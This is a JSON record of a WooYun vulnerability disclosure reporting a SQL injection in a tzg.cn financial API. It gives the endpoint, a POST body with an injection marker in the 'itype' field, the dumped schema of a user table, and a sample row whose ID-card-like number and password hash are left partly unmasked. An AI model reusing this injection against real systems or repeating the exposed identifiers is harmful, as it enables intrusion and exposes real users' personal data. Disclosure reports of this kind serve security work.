{"id": 74134, "wybug_id": "wooyun-2016-0167744", "wybug_title": "金融安全之铜掌柜SQL注入漏洞可导致数十万用户信息泄露", "wybug_corp": "tzg.cn", "wybug_author": "路人甲", "wybug_date": "2016-01-06 18:45", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "接口"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 铜掌柜数据接口验证不严，存在SQL注入漏洞，导致可泄露主库所有信息，包括60多万用户的账号密码、银行卡信息等 详细说明：  接口：http://rest.tzg.cn/tzgCredit/investor/asset/red/list/v2方法：POST提交内容：{\"pageSize\":10,\"iloginAccountId\":123456,\"pageIndex\":1,\"itype\":\"1*\"}   漏洞证明：  tbloginaccount表下所有字段：+------------------------+--------------+| Column                 | Type         |+------------------------+--------------+| dtCreate               | datetime     || dtFastLastPayErrorTime | datetime     || dtFirstInvest          | datetime     || dtLastLogin            | datetime     || dtLastPayError         | datetime     || dtLastSale             | datetime     || dtModify               | datetime     || dtUpFastPayTime        | datetime     || iCardType              | int(2)       || id                     | int(11)      || iFastPayErrorTimes     | int(11)      || iFastPayState          | int(2)       || iLevel                 | int(2)       || iOriginal              | int(2)       || iPaymentcipherState    | int(2)       || iType                  | int(2)       || iValid                 | int(2)       || iVerifyEmail           | int(2)       || iVerifyIDCard          | int(2)       || iVerifyPhone           | int(2)       || numInvestTimes         | int(11)      || numPayErrorTimes       | int(11)      || vcCardCode             | varchar(50)  || vcDeviceID             | varchar(255) || vcEmail                | varchar(50)  || vcFastPayPassword      | varchar(255) || vcLoginName            | varchar(50)  || vcName                 | varchar(500) || vcPassword             | varchar(255) || vcPaymentcipher        | varchar(255) || vcPhone                | char(13)     || vcRecommendCode        | varchar(50)  || vcRegisterDevice       | varchar(50)  || vcSource               | varchar(50)  |+------------------------+--------------+tbloginaccount表中信息采样证明：| 126 | 1      | NULL       | 1             | 2     | 2      | 刘[马塞克]欢     | 13867[马塞克][马塞克]5646 | NULL              | NULL     | 2015-02-05 15:20:57 | 2014-10-06 19:34:50 | 2         | 1         | NULL       | 522701198806163410 | adcdb583646473905dd5d381339b5c27e[马塞克][马塞克]ea2897d7407b1f462471b4d1d6f5c | 2015-08-16 18:09:32 | lrh[马塞克]sym     | 2            | 1            | NULL          | NULL                | 0              | NULL                | NULL            | NULL                | 000126          | pc               | NULL             | NULL                                                             | NULL               | NULL                | NULL     修复方案：  APP中的请求接口不知道为何经常不被开发所重视\n参数赋值有效性验证\n   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-01-06 20:28 厂商回复： 未重现 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-06 20:37 |    \t\tFlyhis \t\t\t( 普通白帽子  |\t\t\t        Rank:706 漏洞数:234        | !)\t\t \n  未重现    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}